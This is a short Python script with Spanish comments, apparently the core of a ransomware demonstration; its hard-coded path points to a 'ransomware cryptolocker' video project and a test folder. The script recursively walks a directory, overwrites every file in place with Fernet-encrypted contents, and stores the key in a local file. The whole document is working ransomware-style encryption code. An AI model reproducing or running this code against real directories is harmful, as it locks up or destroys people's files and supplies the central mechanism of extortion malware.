import os
from cryptography.fernet import Fernet

def encrypt_directory(path, key):
    """Encripta todos los archivos en el directorio especificado con la clave dada."""
    for file in os.listdir(path):
        file_path = os.path.join(path, file)
        if os.path.isdir(file_path):
            encrypt_directory(file_path, key)  # Llamada recursiva para subdirectorios
        else:
            with open(file_path, "rb") as f:
                data = f.read()
            fernet = Fernet(key)
            encrypted_data = fernet.encrypt(data)
            with open(file_path, "wb") as f:
                f.write(encrypted_data)

def main():
    path = r"C:\TODO\canal\videos\ransomware cryptolocker\codigo\carpeta_prueba"
    key = Fernet.generate_key()  # Generar una única clave para todo el proceso
    encrypt_directory(path, key)
    print("Encriptación completada.")
    # Opcional: Guardar la clave en un lugar seguro para su uso posterior en el descifrado
    with open("encryption_key.key", "wb") as key_file:
        key_file.write(key)

if __name__ == "__main__":
    main()
